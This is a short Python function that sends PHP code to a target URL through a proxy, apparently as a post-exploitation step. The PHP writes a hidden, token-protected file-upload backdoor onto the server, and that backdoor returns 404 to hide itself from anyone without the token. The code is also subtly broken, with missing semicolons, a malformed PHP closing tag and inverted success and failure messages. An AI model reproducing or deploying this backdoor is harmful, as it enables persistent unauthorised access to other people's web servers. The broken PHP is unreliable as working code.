Python Post php

```python
def set_basic_upload(url, proxy, path, token):
	phpcode = '''<?php
	$f = "%s"
	$d = "<?php 
		if(isset(\$_POST['token'])&&\$_POST['token']==='%s')
		{
			\$target = \$_POST['uploadToPath']; move_uploaded_file(\$_FILES['fileToUpload']['tmp_name'], \$target);
		}else{
			http_response_code(404);
		}
	>"
	
	$h = fopen($f, "w");
	if ($h === false)
	{
		echo "open $f succeed!";
	}else{
		if (fwrite($h, $d) === false)
		{
			echo "write $f faild!";
		}else{
			echo "write $f succeed!";
		}
	}
	fclose($h);
	?>'''
    
    phpcode = phpcode % (path, token)
    return send_post_request(url, proxy, data=phpcode)





























```

